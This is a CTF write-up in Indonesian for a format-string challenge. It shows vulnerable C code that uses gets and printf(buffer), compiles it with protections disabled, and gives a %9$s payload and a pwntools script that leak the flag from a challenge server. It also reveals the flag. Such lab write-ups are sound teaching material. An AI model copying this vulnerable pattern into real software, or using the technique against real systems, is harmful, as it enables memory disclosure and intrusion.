Mari bermain input-inputan bersama mimin, Mimin sebentar aja yah :( lelah soalnya.

```
nc 103.157.96.13 2332
```

#### Source 

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char * flag = "CTFR{REDACTED}";
    char buffer[24];
    gets(buffer);
    printf(buffer);
    return 0;
}
```

compile biar bisa didebug dulu

```bash
 gcc -fno-stack-protector -z execstack -o src src.c  
```

 Load ke GDB
```
$ gdb -q src                                        
Reading symbols from src...
(No debugging symbols found in src)
gdb-peda$ pd main
Dump of assembler code for function main:
   0x0000000000001145 <+0>:     push   rbp
   0x0000000000001146 <+1>:     mov    rbp,rsp
   0x0000000000001149 <+4>:     sub    rsp,0x20
   0x000000000000114d <+8>:     lea    rax,[rip+0xeb0]        # 0x2004
   0x0000000000001154 <+15>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001158 <+19>:    lea    rax,[rbp-0x20]
   0x000000000000115c <+23>:    mov    rdi,rax
   0x000000000000115f <+26>:    mov    eax,0x0
   0x0000000000001164 <+31>:    call   0x1040 <gets@plt>
   0x0000000000001169 <+36>:    lea    rax,[rbp-0x20]
   0x000000000000116d <+40>:    mov    rdi,rax
   0x0000000000001170 <+43>:    mov    eax,0x0
   0x0000000000001175 <+48>:    call   0x1030 <printf@plt>
   0x000000000000117a <+53>:    mov    eax,0x0
   0x000000000000117f <+58>:    leave  
   0x0000000000001180 <+59>:    ret    
End of assembler dump.
gdb-peda$ b *main+48
Breakpoint 1 at 0x1175
gdb-peda$ r
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 ("AAAAAAAA")
...
0024| 0x7fffffffddc8 --> 0x555555556004 ("CTFR{REDACTED}")
...
[------------------------------------------------------------------------------]
```

sudah jelas kalo harus nge-leak flag dari format string yang ada di alamat `0x555555556004` dari dalam stack, karena di compile ke 64 bit, coba masukin input `%x` sampe kira-kira alamat `0x55556004` muncul dibagian akhir

```bash
python2 -c "print '%x' * 9" | ./src 
```

Dan hasilnya

```bash
555592a10f7fa8980ffffde6007825782578257825ff00782555556004
```

posisi alamat `0x55556004` pada stack dengan urutan ke 9, jadi tinggal di baca aja stringya karena berdasarkan sourcenya flagnya berbentuk string

```bash
$ ./src
%9$s
CTFR{REDACTED} 
```
karena di local jalan, coba di remote nya pake pwntool atau langsung juga bisa

```bash
$ nc 103.157.96.13 2332
Please Input :
%9$s
CTFR{f0rm4t_5tr1ng_3xpl01t_15_4w3s0m3}
```

kalo dengan pwntools

```python
from pwn import *
p = remote('103.157.96.13', 2332)
p.sendline("%9$s")
res = p.recvall()
log.info(res)
p.close()
```

```bash
$ python2 solve.py                 
[+] Opening connection to 103.157.96.13 on port 2332: Done
[+] Receiving all data: Done (53B)
[*] Closed connection to 103.157.96.13 port 2332
[*] Please Input :
    CTFR{f0rm4t_5tr1ng_3xpl01t_15_4w3s0m3}
```

Flag
```
CTFR{f0rm4t_5tr1ng_3xpl01t_15_4w3s0m3}
```